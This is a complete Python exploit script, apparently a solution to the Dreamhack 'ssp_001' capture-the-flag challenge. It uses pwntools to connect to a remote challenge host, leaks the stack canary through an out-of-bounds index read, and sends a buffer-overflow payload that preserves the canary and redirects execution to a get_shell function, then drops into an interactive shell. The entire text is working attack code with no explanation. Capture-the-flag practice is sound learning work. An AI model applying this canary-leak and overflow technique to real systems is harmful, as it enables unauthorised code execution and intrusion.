from pwn import *
p = remote('host1.dreamhack.games', 14124)
elf = ELF('./ssp_001')
# Convert the canary from string to bytes properly

canary = b''
for i in range(4):
    p.sendline(b'P')
    p.recvuntil(b'Element index : ')
    p.sendline(str(128 + i).encode())
    p.recvuntil(b'Element of index ')
    p.recvuntil(b'is : ')
    value = p.recvline().strip()
    canary += bytes.fromhex(value.decode())
print(canary)
canary = u32(canary)

payload = 64*b'A' + p32(canary)*3  + p32(elf.sym['get_shell'])
p.recvuntil('> ')
p.sendline(b'E\n')
p.sendafter('Name Size : ', b'100\n')
p.sendafter('Name : ', payload)
p.interactive()